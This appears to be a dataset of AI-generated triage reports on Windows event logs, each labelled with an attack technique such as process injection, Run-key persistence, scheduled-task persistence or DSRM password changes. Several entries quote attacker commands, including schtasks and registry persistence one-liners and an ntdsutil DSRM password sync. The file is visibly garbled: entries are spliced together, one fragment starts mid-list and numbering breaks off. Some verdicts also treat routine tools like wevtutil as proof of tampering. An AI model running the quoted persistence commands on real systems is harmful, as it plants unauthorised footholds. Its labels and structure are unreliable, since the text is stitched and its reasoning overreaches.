Thread Execution Hijacking,"Upon reviewing the provided logs from the Windows host, several indicators of suspicious activity have been detected. Below is a detailed analysis highlighting key areas of concern:

### Analysis of Logs

1. **PowerShell Activity:**
   - The PowerShell logs show a script executing with the intention of starting a Notepad process, launching an executable (`InjectContext.exe`), pausing for a few seconds, and then terminating the Notepad process. 
   - The executable is located in a temporary directory, which is unusual for legitimate executables. This behavior suggests potential process injection or malicious payload delivery.
   - The PowerShell command indicates a chained execution, which is a common tactic for malware delivery and evading detection.

2. **Sysmon Logs Findings:**
   - The Sysmon logs reveal the execution of `InjectContext.exe`, which corroborates the activity seen in the PowerShell logs.
   - A high integrity level is associated with processes being executed, usually implying administrative privileges which can indicate potential privilege escalation to perform unauthorized actions.
   - Frequent launching of system utilities such as `wevtutil.exe` may suggest log manipulation or querying, possibly to evade detection or gather information.

3. **Security Logs:**
   - Multiple logon events (4624) in rapid succession with elevated privileges (`SeDebugPrivilege`, `SeSecurityPrivilege`, etc.) are indicative of potential privilege escalation or suspicious administrative activity.
   - Event ID 4672 entries for privileged service operations further raise concerns about potential unauthorized access or privilege misuse.

4. **General Observations:**
   - The clustering of various process creation events, privilege escalation attempts, and the presence of suspicious executables strongly indicate unauthorized and potentially harmful actions.
   - Injection-related activity and unusual use of PowerShell with temporary files involved are common in advanced persistent threats (APTs) and malware delivery mechanisms.

### Conclusion

Given the nature of the activity captured in the logs, the behavior is consistent with malicious actions. The invocation of processes from non-standard locations, the use of PowerShell for suspicious scripts, and potential privilege escalation all indicate a high likelihood of a security compromise.

### Resolution: MALICIOUS

The evidence strongly supports the conclusion that the activity recorded in the logs is malicious. Immediate action is necessary to contain and remediate the threat.

### Recommendations:

1. **Isolate the Affected Host:**
   - Disconnect the server from the network to prevent potential spread.

2. **Conduct a Thorough Investigation:**
   - Analyze the full scope of changes made by the mal-activities.
   - Examine the integrity of other systems potentially affected within the network.

3. **Engage Incident Response:**
   - Engage your incident response team to initiate remediation procedures.
   - Gather evidence for potential forensic analysis.

4. **Review and Enhance Security Policies:**
   - Review user privilege settings to ensure least privilege principles.
   - Increase monitoring on PowerShell and scripting activities across the network.

5. **Patch and Update Systems:**
   - Ensure all systems are up to date with the latest patches to mitigate known vulnerabilities.

6. **Educate and Train Staff:**
   - Conduct awareness training to prevent phishing and similar attacks that could lead to compromise.

Pursuing these recommendations will be pivotal in addressing the identified threats and reinforcing your security posture to prevent future incidents."
Dirty Vanity process Injection,"### Analysis

Upon analyzing the provided Windows event logs, several unusual and potentially malicious activities have been identified:

1. **PowerShell Usage:**
   - Multiple PowerShell log entries indicate the execution of suspicious commands. A PowerShell command was used to start a process that launches another executable from a temp directory:
     ```
     powershell.exe & {Start-Process \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\redVanity.exe\"" (Start-Process calc.exe -PassThru).Id}
     ```
   - The path used (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\redVanity.exe`) for executing `redVanity.exe` and subsequently executing the calculator (`calc.exe`) is highly suspicious, as temporary directories are commonly used by malware to hide malicious binaries.

2. **Sysmon Logs:**
   - Sysmon logs related to the `wevtutil.exe` and `conhost.exe` processes do not indicate immediate malicious activity; however, the execution context `(user: SERVER002\\admin_test)` and involvement of the `wevtutil.exe` in event logs might be indicative of log manipulation or a cover-up of malicious actions.

3. **Security and System Logs:**
   - There is an event indicating privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.) granted to the user `admin_test`. This level of privilege escalation could imply unauthorized privilege use:
     ```
     Privileges: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege
     ```
   - Time change events, although can have legitimate reasons such as time synchronization, could also be leveraged to obscure timestamps of malicious activities.

4. **General Observation:**
   - The combination of executing a binary (`redVanity.exe`) from a temp directory using PowerShell, combined with high privileges, and attempts to change time settings suggest an adversary is trying to persist in the system or conduct other malicious operations while attempting to remain undetected.

### Conclusion

**Resolution: MALICIOUS**

The logs suggest that there is malicious activity occurring. The execution of an unusual binary from a temporary directory using PowerShell with high-level privileges is indicative of a potential compromise. There appears to be an attempt to manipulate system logs and possibly alter system time which can be techniques used by attackers to hide their tracks and maintain persistence.

### Recommendations

1. **Immediate Isolation:** The affected machine should be isolated from the network to prevent further spread or damage.
2. **Malware Removal:** Conduct a thorough malware scan and removal process.
3. **Investigation:** Further investigate the source and the actions of `redVanity.exe`.
4. **Review and Revoke Privileges:** Review the privileges of the account involved and consider revoking any unnecessary privileges.
5. **Audit and Monitor:** Increase the monitoring of suspicious PowerShell activities and other high-risk actions.
6. **System Restoration:** Restore the affected system from a clean backup if necessary."
Process injection ListPlanting,"### Detailed Analysis of the Logs

#### Anomalous and Suspicious Behavior:
1. **PowerShell Usage:**
   - There is a significant number of PowerShell executions, particularly one instance that involves executing a script from a temporary location: 
     - **Command:** `""powershell.exe"" & {Start-Process \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.015\\bin\\ListPlanting.exe\"", Start-Sleep -Seconds 7, Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force}`
   - PowerShell is a powerful command-line tool frequently used by attackers for activities such as downloading and executing payloads. The execution from a temporary location can be a common tactic used in malware activities.

2. **Process Execution:**
   - The existence of a process named `ListPlanting.exe` in the temporary directory is highly suspicious. Temporary directories are commonly used by malware for launching malicious executables. The naming of `ListPlanting.exe` doesn't relate to any known legitimate software and its placement in a temp folder is questionable.
   - The operation includes stopping Notepad processes, which might be an attempt to close user distractions or terminate a possibly legit application for malicious intent.

3. **Security Privileges:**
   - The user `admin_test` has been seen acquiring extensive privileges such as:
     - SeDebugPrivilege, SeBackupPrivilege, and SeRestorePrivilege among others. These privileges can be used to perform actions like modifying OS settings, loading drivers, and impersonating other users — all of which are high-risk indicators if not typically in the user's role.

4. **User Activity:**
   - The login activities of `admin_test` (Event IDs 4624 and 4672) coincide with the timeframes of the PowerShell activities and execution of suspicious processes. This suggests unauthorized access or misuse of an account with administrative privileges.

#### Indicators of Malicious Activity:
- The actions point towards potential compromise:
  - Execution of potentially malicious PowerShell scripts from temporary locations.
  - High-privilege assignment to the `admin_test` user account.
  - Placement and execution of suspicious programs like `ListPlanting.exe`.

### Assessment, Threats, and Risks Identified:
- **Assessment:** The activities observed in these logs indicate that there is a high probability of malicious actions taking place. The launching of scripts from a temporary directory and the unusual use of PowerShell are both tactics associated with malicious activities.
- **Threats/Risks:**
  - Possible unauthorized access and control over the system by malicious actors.
  - Potential data exfiltration or system compromise using the elevated privileges obtained.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Isolate the affected host (Server002) to prevent further potential malicious activities and propagation within the network.
   - Conduct a thorough malware scan and forensic analysis on the system.

2. **Further Investigation:**
   - Review user activity logs to identify the source of the `admin_test` account compromise if any unauthorized activities are evident.
   - Investigate network logs for any unusual outbound communications associated with this host.

3. **Preventative Measures:**
   - Enforce stricter security policies, including privilege management and regular audits of administrative accounts.
   - Educate users about the dangers of executing unknown applications or scripts.

### Resolution:
- **Resolution: MALICIOUS** - The activities identified in the logs strongly indicate deliberate, malicious actions that potentially compromise the system. Further actions are required to mitigate the risk and ensure the environment's security."
Parent PID Spoofing - Spawn from Specified Process,"Upon reviewing the provided Windows event logs, several observations can be made regarding potential suspicious or malicious activities.

### Observations:

1. **Windows Update Activities:**
   - Several events (EventID: 44) from the `Microsoft-Windows-WindowsUpdateClient` indicate regular updates to applications like Microsoft Camera, Your Phone, and Microsoft VCLibs. These activities are typical of routine system update processes and do not reflect any immediate signs of malicious intent.

2. **PowerShell Activities:**
   - There are multiple PowerShell events (EventID: 600) indicating various modules being loaded and commands being executed. 
   - Particularly suspicious is the PowerShell command line: `powershell.exe & {Start-ATHProcessUnderSpecificParent -ParentId $PID -TestGuid 12345678-1234-1234-1234-123456789123}`. The use of a specific parent process with PowerShell scripting can sometimes indicate attempts to evade detection or execute processes in a stealthy manner.
   - Another concerning command: `powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;`, which searches through `.inf` files, could be indicative of reconnaissance or vulnerability scanning.
   - The execution of PowerShell within a restricted policy with adjusted logic flow demands further scrutiny.

3. **Security Logs:**
   - The logs include a series of `EventID: 5379` entries related to credential reading attempts. The repeated failure to read credentials could indicate an attempt to access unauthorized resources or data.
   - `EventID: 4624` and `EventID: 4672` show SYSTEM logins and privilege assignments, which are not inherently suspicious but worth correlating with legitimate administrative tasks.

4. **Sysmon Logs:**
   - There are instances where PowerShell, `wevtutil.exe`, and `conhost.exe` have been executed by the user `SERVER002\\admin_test`. The consistent execution of system utilities such as `wevtutil.exe` might be part of logging or monitoring tasks, but combined with the PowerShell activities, it is suspicious.
   - The use of utilities like `whoami.exe` and `hostname.exe` might signify environment probing or identification checks, which are often employed by attackers after gaining initial access.

### Assessment:

- **Suspicious Behavior Identified:** While no direct evidence of outright malicious activity is immediately apparent, the nature of PowerShell usage, system utility executions, and failed credential accesses merits a closer look.
- **Risks Identified:** Potential unauthorized credential access attempts and abnormal use of PowerShell scripts with evasion techniques raise significant concerns for possible lateral movement or privilege escalation attempts.

### Guidance:

- **Proceed with Investigation**: Further investigate the context and origins of the PowerShell scripts and their intended use. Verify the legitimacy of the user `SERVER002\\admin_test` and the actions associated with this account.
- **Enhance Monitoring**: Increase auditing and monitoring on PowerShell activity and other high-risk administrative actions on the server.
- **Credentials and Environment Review**: Review credential policies for robust access control and consider an environment integrity assessment to ensure no unauthorized changes have been made.

### Resolution:
Based on the analyzed logs and potential risks, I classify this as **SUSPICIOUS** activity that warrants further investigation and heightened monitoring efforts."
Driver Installation Using pnputil.exe,"Based on the provided Windows event logs, I have conducted a detailed analysis focusing on any signs of malicious activity. Here are the key observations:

1. **High Integrity Levels:**
   - The logs indicate multiple processes running at a ""High"" integrity level under the user ""SERVER002\\admin_test"", which is typical for administrative accounts and might not be inherently suspicious unless accompanied by unusual behavior.

2. **Use of Common System Utilities:**
   - Common system utilities such as `hostname.exe`, `whoami.exe`, `wevtutil.exe`, and `pnputil.exe` are executed. While these are legitimate Windows binaries, their usage can be a part of living-off-the-land (LotL) tactics if not justified by regular activity.
   - `pnputil.exe` is specifically used with command-line arguments to install a driver (acpipmi.inf) which could be suspicious if not part of regular system administration or updates.

3. **PowerShell Activity:**
   - PowerShell is used to execute a command involving `pnputil.exe`, which might be aimed at manipulating device drivers. While not inherently malicious, this is unusual unless part of known administrative procedures.

4. **Execution of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` (Event Viewer Utility) are noted, which could be used for clearing event logs to eradicate traces of potentially malicious activities. Frequent use of this utility should be investigated.

5. **Edge Update Processes:**
   - Numerous Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) are logged, but these appear to be part of scheduled updates. They are executed by the system account, which is standard for system updates.

6. **Logon Events:**
   - There is a logon event (4624) using NTLM authentication with known privileges as part of the logon session, which seems to be consistent with normal user admin activity.
   - Privilege assignment (Event ID 4672) indicates that the user `admin_test` was granted various privileges including `SeDebugPrivilege` and `SeLoadDriverPrivilege`, common for administrative activities but potentially risky if exploited.

**Assessment and Resolution:**

- **BENIGN:** If these activities are part of regular system operations or administrative tasks on the CEO’s machine.
- **SUSPICIOUS:** If the execution of utilities like `pnputil.exe` and `wevtutil.exe` is not part of scheduled administrative actions and lacks justification.
- **MALICIOUS:** If the above actions are not recognized by the IT team or the CEO as legitimate, especially the installation of drivers and event log modifications via unverified PowerShell commands.

Given the evidence, the situation seems **SUSPICIOUS** due to potentially unauthorized or unexplained use of system utilities and PowerShell to modify system states. It is advisable to:
- Verify with the IT or Admin team whether these actions were authorized and part of routine operations.
- Check for related alerts on connected EDR solutions for corroborative evidence.
- Investigate the source and intent behind the PowerShell command and `pnputil.exe` usage.
- Establish whether the driver installation is necessary and consistent with legitimate software or system requirements.

Proceed with caution and consider isolating systems if further unauthorized activities are detected during verification."
Launch NSudo Executable,"Upon reviewing the provided Windows event logs, several points of interest and signs of suspicious activities have been identified, which warrant further investigation:

### Suspicious Observations:
1. **PowerShell Execution with NSudo:**
   - The PowerShell logs show the execution of `NSudoLG.exe` with elevated privileges (`-U:T -P:E`). This tool, NSudo, is known for allowing administrative control over the system and can be used for privilege escalation.
   - The command sequence includes starting the process, a sleep command, followed by a forced termination of `cmd`. This behavior is unconventional for a standard user operation and suggests potential misuse or malicious intent.

2. **Security Log Event ID 5379 (Credential Validation Error):**
   - Multiple entries with `EventID 5379` indicate unsuccessful credential validation attempts with the return code `3221226021`, which translates to ""No such user"".
   - The repeated failed access attempts suggest a brute-force or similar activity aimed at credential validation.
   - The logs refer to a user `MicrosoftAccount:user=02txoixylodcstop`, which appears anomalous and not standard.

3. **Unusual Process Activities:**
   - Numerous Sysmon logs indicate process creations of `powershell.exe`, `wevtutil.exe`, and `conhost.exe`, which were executed by the user `admin_test`. The execution of `wevtutil.exe` might indicate attempts to export or clear event logs. Its occurrence alongside other suspicious activities implies potential log tampering.

4. **Tasks Executed by `taskhostw.exe`:**
   - Security logs `EventID 4798` show `taskhostw.exe` interacting with user accounts including Administrator, Guest, and other accounts. This may imply privilege enumeration or persistence mechanisms being explored.

### Concluding Assessment:
Based on the analysis, there are clear indicators of potentially malicious activities:
- The use of `NSudo` with PowerShell suggests attempts at privilege escalation.
- Repeated failed credential validation events might indicate an attempted unauthorized access or attack.
- The creation and execution of suspicious processes like `powershell.exe` and `wevtutil.exe` under contexts that are not typical of regular operations point to possible exploits or reconnaissance activities.

### Resolution:
Given the presence of multiple suspicious activities that align with known exploitation methods and privilege escalation attempts:

**Resolution: MALICIOUS**

4. **Monitoring and Future Prevention:**
   - Enhance monitoring for anomalous process and network activity.
   - Deploy threat detection and response tools to alert on similar suspicious behaviors in real time."
Scheduled Task Startup Script,"### Detailed Analysis:

Upon reviewing the provided Windows event logs, there are several indicators and patterns to analyze for potential malicious activity. Below, I have detailed key findings from each section of the logs:

#### Key Suspicious Behaviors:

1. **Unusual Process Execution:**
   - **`cmd.exe` Activity:** There is a notable execution of `cmd.exe` that includes command-line arguments for creating scheduled tasks.
   - **Scheduled Tasks Creation:**
     - Two scheduled tasks are being created via `schtasks.exe` with the following commands:
       - `schtasks /create /tn ""data_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe""`
       - `schtasks /create /tn ""data_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""`
     - The execution of `calc.exe` through scheduled tasks upon logon and startup is suspicious and typical of persistence mechanisms employed by malware.

2. **Processes with Elevated Privileges:**
   - Commands executed with a **high integrity level**, indicating elevated privileges, were observed. These processes include the handling of scheduled tasks which were set to execute under potentially elevated contexts.

3. **Process Hierarchies:**
   - The parent process for `cmd.exe` during the scheduled task creation was `wsmprovhost.exe` with the command line indicating it is being used as an embedded COM service. This is usual in remote management scenarios but requires confirmation of legitimate context.

#### Potential Indicators of Malicious Activity:

- **Persistence Mechanism:** The use of `schtasks` to create tasks that execute `calc.exe` could be a benign test; however, if unauthorized or without clear business justification, it is a common persistence mechanism for malicious actors.
  
- **Unexpected Behaviour:** The `cmd.exe` usage is orchestrated to maintain persistence by leveraging typical system directories (`C:\\Windows\\System32\\`) which suggests potential misuse.

### Assessment:

- **Risk Analysis:**
  - The creation of scheduled tasks to execute applications without clear justification or documentation is a potential security risk.
  - Elevated privileges associated with these tasks could lead to unauthorized access or escalation if exploited.

### Conclusion:

Based on the analysis, the logs demonstrate activity that aligns with common attack vectors for persistence through scheduled tasks. While there is no direct evidence of deliberate malicious intent beyond the scheduling of `calc.exe`, this pattern is suspicious and warrants further investigation.

### Resolution:
- **SUSPICIOUS:** The activity appears unusual and potentially unauthorized, necessitating further investigation. The tasks should be verified, and their creation justified. If it remains unexplained, these tasks should be disabled and reviewed by your IT security team.
  
### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Verify the legitimacy of the scheduled task creation with the relevant IT personnel or the system administrator.

2. **Investigate User Activity:**
   - Check the historical activity logs for the user `SERVER002\\admin_test` to determine if there is a pattern of unverified or questionable actions.
   - Confirm whether the usage of `wsmprovhost.exe` and elevated commands are consistent with expected remote administrative tasks.

3. **Review System Integrity:**
   - Utilize additional endpoint security tools to analyze the machine for other signs of compromise.
   - Create a snapshot or gather forensic data for detailed analysis if unauthorized activity is suspected.

4. **Report and Mitigation:**
   - Report the finding to the security operations center (SOC) for broader correlation with other alerts.
   - Consider removing or remediating the scheduled tasks until their legitimacy is confirmed."
Password Change on Directory Service Restore Mode (DSRM) Account,"### Analysis of the provided event logs:

#### Suspicious Indicators:
1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - **`wevtutil.exe`** and **`conhost.exe`** are seen executed multiple times by the user `SERVER002\\admin_test` within a very short timeframe from `2024-10-24 10:06:00.822` to `2024-10-24 10:06:01.213`.
   - The execution of `wevtutil.exe` can be utilized to manipulate or query Windows Event Logs, which could be an indicator of log tampering or preparation for malicious activity.
   - The repeated execution of these processes in quick succession is unusual and should be investigated further.

2. **Execution of Elevated Commands:**
   - Event 17979 highlights the use of `cmd.exe` with command-line arguments `ntdsutil ""set dsrm password"" ""sync from domain account %username%"" ""q"" ""q""`.
   - This command is indicative of attempting to modify the Directory Services Restore Mode (DSRM) password, which is highly sensitive and could be malicious if unauthorized.
   - The integrity level is `High`, suggesting administrative privilege was used for this operation.

3. **Time Manipulation Events:**
   - Security event logs (EventID 4616) and System event logs show attempts to change the system time, which is potentially problematic as this can be used to cover tracks of malicious activities by modifying the timestamps in logs.

4. **Presence of Privileged Logon Sessions:**
   - Security log events 4672 indicate that the user `admin_test` has been granted high privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, etc., which are critical for sensitive operations and could be abused for malicious purposes.

#### Benign Activity:
- Execution of standard processes such as `whoami.exe`, `HOSTNAME.EXE`, and other essential system processes by an authenticated user typically do not indicate malicious activity by themselves.

### Assessment and Resolution:
Given the findings, there is observable suspicious behavior, including multiple rapid executions of log utility and command host processes, attempts to change sensitive system settings like Directory Services Restore Mode password, and time manipulation events that could obscure audit trails. Additionally, high privilege usage suggests potential exploitation for further compromise.

### Guidance:
The resolution for this case, considering the detailed indicators, is **SUSPICIOUS**.

Create a new time provider,"### Analysis of Provided Windows Event Logs

### Summary:
Upon analyzing the provided logs from the Application, System, Windows PowerShell, Sysmon, and Security channels, I have identified potentially malicious behavior related to the use of PowerShell scripts and suspicious registry modifications. Below is a detailed analysis that outlines this behavior and associated indicators of compromise.

### Findings:

1. **PowerShell Activity**:
   - Multiple entries in the Windows PowerShell log indicate the execution of a PowerShell command with suspicious activities such as stopping the Windows Time Service (`w32time`), copying a DLL (`fileTest.dll`) from a temporary location to a public directory, and modifying the registry to add a completely new time provider. This is typically indicative of an attempt to persist or manipulate time settings for malicious purposes.

2. **Registry Modifications**:
   - Registry changes associated with the suspicious DLL (`fileTest.dll`) are recorded. The registry keys being created and modified under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\fileTest` include enabling it and marking it as an input provider, which mimics legitimate time provider settings.
   - This behavior can suggest attempts to establish persistence on the host by injecting malicious code or altering the time service's behavior.

3. **Sysmon Logs**:
   - The Sysmon logs show the execution and chaining of processes related to `net`, `reg`, and other command-line utilities often used in lateral movement, reconnaissance, or privilege escalation activities.
   - PowerShell execution is linked with the `net stop w32time` and several `reg.exe` commands altering time provider settings.
   - The presence of `svchost.exe` being manipulated could also indicate an attempt to embed or hide malicious activities behind legitimate Windows processes.

4. **Time Service Manipulation**:
   - Event logs point to under-the-hood manipulation of the time service, notably a failed time provider start related to a non-legitimate module (`fileTest`).
   - This manipulation reinforces the hypothesis of a designed attempt to exploit or modify system times, which could be crucial for evading detections based on timestamp analysis or logs.

### Assessment:
Given the nature and pattern of the logs, they collectively demonstrate a likelihood of malicious activity. The modification of the Windows Time Service settings, execution of unsigned or unknown DLLs, in conjunction with PowerShell-based scripts, represent a clear security threat.

### Resolution: **MALICIOUS**

### Guidance:
1. **Immediate Steps**:
   - Quarantine the affected system(s) to prevent any further compromise or lateral movement.
   - Conduct a full malware scan and consider reimaging the system if necessary.
   - Isolate the `fileTest.dll` and analyze it for known or unknown malware signatures.

2. **Further Investigation**:
   - Carry out a network-wide search for similar registry changes or PowerShell commands indicative of this attack.
   - Examine other hosts for similar patterns indicative of lateral movement or additional compromised systems.
   - Monitor logs continuously for any sign of attempted persistence or further compromise.
  
3. **System Hardening**:
   - Implement strict PowerShell script execution policies using Windows Group Policy.
   - Enhance detection systems for similar anomalies, emphasizing registry changes in service configurations.
   - Ensure critical system process monitors and alerts are in place to detect unauthorized changes to services or critical system files. 

By following these guidelines, the organization can contain the present situation effectively and improve defenses against similar future threats."

2. **System Log:**
   - **Time Synchronization Events (Event ID: 24, 1):** Time synchronizations and adjustments by `svchost.exe` are logged, which appears consistent with standard Windows time service operations. No anomalies or suspicious behavior detected.

3. **Windows PowerShell Log:**
   - **Event 600:** Shows execution of `powershell.exe` with a command line pointing to a temporary path executing `UuidFromStringA.exe` with the `-debug` flag. This could be considered suspicious as it involves executing a non-standard executable from a temporary path, possibly indicating an attempt to execute code not native to typical system operations.
   
4. **Security Log:**
   - **Time Change Event (Event ID: 4616):** Further confirms time adjustments made earlier. The process `C:\\Windows\\System32\\svchost.exe` handled the event and operates under `LOCAL SERVICE`. It doesn't show any privilege escalation or unusual activity.
   
5. **Sysmon Log:**
   - Frequent executions of typical system binaries (`HOSTNAME.EXE`, `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `MicrosoftEdgeUpdate.exe`). 
   - **Particularly of interest:**  
     - The execution via PowerShell of `UuidFromStringA.exe` in a non-standard directory is further indicated by Sysmon as executed by the `powershell.exe` process with a high integrity level. The command chain seems unusual and should lead to further scrutiny.

### Assessment of the Situation

**Key Indicators:**
- The PowerShell log shows potentially suspicious activity through the invocation of a temporary, non-standard executable (`UuidFromStringA.exe`) using `powershell.exe`. Executing binaries from temporary directories can often indicate malware or unauthorized administrative scripts being deployed.

**Final Resolution:** 
- **SUSPICIOUS**

### Guidance

1. **Immediate Actions:**
   - Isolate the system to prevent any potential spread of malware.
   - Investigate `UuidFromStringA.exe` and determine its origin, legitimacy, and hash it against known malware databases.
   - Check file and script integrity within `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\`.

2. **Further Investigation:**
   - Conduct a detailed analysis of the PowerShell usage and command history on the machine.
   - Monitor network activity to detect any unusual outbound connections originating from this machine.

3. **Enhance Monitoring:**
   - Increase the level of monitoring on the CEO's machine to capture any additional suspicious behaviors.

By conducting these investigations, the company can gain greater insight into whether an attack is taking place and ensure appropriate defensive or remediation actions are taken accordingly."
"Scheduled Task (""Ghost Task"") via Registry Key Manipulation","## Analysis of the Windows Event Logs

### Overview
The logs provided cover several events taking place on a Windows machine named `Server002`. The focus is on identifying suspicious or malicious activities, particularly on the CEO's machine which is suggested to be under scrutiny due to an EDR-generated alert. Below is the detailed analysis of the logs:

### Application Log
- The logs indicate that Windows Defender was active, which suggests that basic endpoint security features were operational.

### Sysmon Log
- **PowerShell Execution**: A PowerShell process was executed by the user `admin_test`. PowerShell execution is commonplace, but can be leveraged for malicious activity. The execution lacks command-line details, making it hard to assess intent.
- **Wevtutil Execution**: Wevtutil was executed multiple times. This utility is used to manage event logs which can be suspicious if used by unauthorized personnel to clear logs.
- **PsExec Usage**: There is an unusual entry where `cmd.exe` is used to execute `PsExec` from a temporary directory. PsExec, part of Sysinternals suite, is often used for administering systems remotely. However, it can also be used by attackers for lateral movement or executing malicious tasks.
  
  - Command used includes references to an executable `GhostTask.exe`, alongside `PsExec.exe`, and attempts to run other commands with elevated privileges. This is indicative of potential lateral movement or privilege escalation attempts.

- **Execution of HOSTNAME and WHOAMI**: The utilities `hostname.exe` and `whoami.exe` executed multiple times. While these commands provide basic information on the system identity and current user, they may be part of reconnaissance commands used by an attacker to gather system information.
- **Edge Update Events**: The execution sequences related to `MicrosoftEdge_X64` and `setup.exe` are consistent with legitimate update processes for Microsoft Edge. The `command-line` arguments do not suggest any tampering.

### Indicators of Suspicious Activity
1. **Unusual Admin Activity**: The user `admin_test` executed several commands, including potentially suspcious ones such as `Wevtutil`, `PsExec`, and `GhostTask.exe` indicating privilege escalation or lateral movement.
2. **Command Execution Patterns**: The PsExec command pattern is concerning given its ability to run processes on remote or local systems with different privileges.

### Conclusion
The presence of `PsExec` and the utility `GhostTask.exe` in the command lines alongside other administrative tools like `whoami` and `hostname`, used within a short timespan, strongly suggests attempts to escalate privileges or perform unauthorized operations. This is further strengthened by the running of `wevtutil`, which may indicate attempts to manipulate or clear system logs.

### Resolution
**Resolution: MALICIOUS**

Given the suspicious use of elevated command executions and the presence of potentially harmful tools like `PsExec` and `GhostTask.exe`, the activities recorded in these logs are deemed malicious. Immediate actions should involve:
- An in-depth forensic investigation to track the source and scope of the breach.
- Temporarily locking down access on the affected `admin_test` account.
- Reviewing and possibly revoking any unnecessary administrative privileges.
- Ensuring full security scans and reviewing other systems for similar signs of compromise."
HKCU - Policy Settings Explorer Run Key,"Based on the provided logs, here's a detailed analysis of potentially suspicious and malicious activity:

### Suspicious Activities and Anomalies:
1. **Multiple PowerShell Executions:**
   - There are several PowerShell executions with a command-line argument appearing to modify the Windows registry. The command is setting a registry key (`HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`) to run `calc.exe`. This type of behavior can be associated with persistence mechanisms, especially when using PowerShell to automate registry changes.
   - The PowerShell command:
     ```shell
     powershell.exe & {if (!(Test-Path -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")){ New-Item -ItemType Key -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" } Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""filetest"" -Value ""C:\Windows\System32\calc.exe""}
     ```
   - This command involves creating a registry path if it doesn't exist and setting a startup entry for Calculator, which could indicate an attempt at maintaining persistence.

2. **Unusual Executions:**

   - The logs show frequent use of `whoami.exe` and `hostname.exe`, but these tools themselves are not inherently suspicious. However, their frequent invocation might be part of reconnaissance or environment profiling.
   - The presence of these processes is less concerning compared to the suspicious PowerShell command.

3. **Wevtutil Executions:**
   - `wevtutil.exe` is a legitimate Windows tool used to manage event logs. Repeated execution without a clear administrative purpose could be indicative of an attempt to hide malicious activity by potentially clearing logs or tampering with them. This warrants further investigation.

### Indicators of Compromise:
- The PowerShell script execution to modify the registry is highly indicative of malicious behavior, aiming for persistence.
- Although the execution of `wevtutil.exe` isn't overly aggressive, it could still be related to malicious activity. The context (without more details) suggests potential manipulation of logging, perhaps as a cover-up action.

### Conclusion and Recommendations:
- **Resolution: MALICIOUS.** The activity involving the PowerShell command modifying the registry for persistence is a strong indicator of malicious behavior. The potential use of `wevtutil.exe` further supports this assessment as it can be leveraged to clear logs and cover tracks.
- **Next Steps:**
  - **Immediate Isolation:** Isolate the affected host to prevent potential lateral movement or data exfiltration.
  - **Containment and Eradication:** Investigate further the details around these executions and registry modifications, and remove any unauthorized startup entries or related files.
  - **Audit and Monitor:** Enable enhanced monitoring for PowerShell activities and specific threat indicators.
  - **Educate Users:** Increase awareness about risky behaviors and the importance of reporting unexpected activities."
Admin Account Manipulate,"**Detailed Analysis of Logs:**

1. **Time Manipulation Observed:**
   - Several events (Event ID 24 and 1 in the System log and Event ID 4616 in the Security log) indicate a discrepancy with system time, implying time manipulation. This is often indicative of attempts to backtrack logs or disrupt normal auditing processes.

2. **Use of PowerShell with Malicious Intent:**
   - A particular PowerShell command was executed as logged in both the Sysmon logs and the Windows PowerShell logs. The command attempts to:
     - Generate a randomized sequence of characters.
     - Query local group members in the Administrators group.
     - Rename the Administrator account to a randomized name, as evidenced by the Event IDs 4738 and 4781 in the Security log, showcasing the actual renaming event.
   - This use of PowerShell, especially with commands aimed at renaming privileged accounts, is highly suspect and indicative of a privilege escalation attempt or obfuscation tactic. 

3. **Unusual Process Executions:**
   - Several instances of critical system processes (`wevtutil.exe`, `whoami.exe`, `conhost.exe`) being executed frequently and swiftly, which may suggest attempts at enumeration or collecting system details in a suspicious manner.
   - Execution of `MicrosoftEdgeUpdate.exe` could be normal in an update scenario, but it's worth noting as a secondary concern in correlation with other Windows logging entries, it shows persistent system access.

4. **Presence of Elevated Privileges:**
   - Event ID 4672 indicates the `admin_test` account was granted a comprehensive set of privileges, including security-sensitive ones such as `SeDebugPrivilege`, which points towards unauthorized access or misuse of system control capabilities.

5. **Authentication and Logon Anomalies:**
   - Multiple NTLM logon activities (`LogonType` 3 indicating network-based activity) for the `admin_test` account raises alarms, especially in conjunction with other administrative actions.

**Assessment and Resolution:**

The analysis of logs reveals multiple indicators of potentially malicious activity. The manipulation of system time, execution of PowerShell scripts to alter critical user accounts, and the presence of multiple system and network privileges being assigned or used by the `admin_test` account strongly suggest that these events are not benign or typical administrative behavior. 

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Isolate the affected machine (Server002) from the network to prevent further propagation or data exfiltration.
   - Change credentials for all known accounts, especially those with administrative access.
   
2. **Further Investigation:**
   - Conduct a deep-dive forensic analysis on Server002 to determine the extent of the breach and identify any other compromised systems.
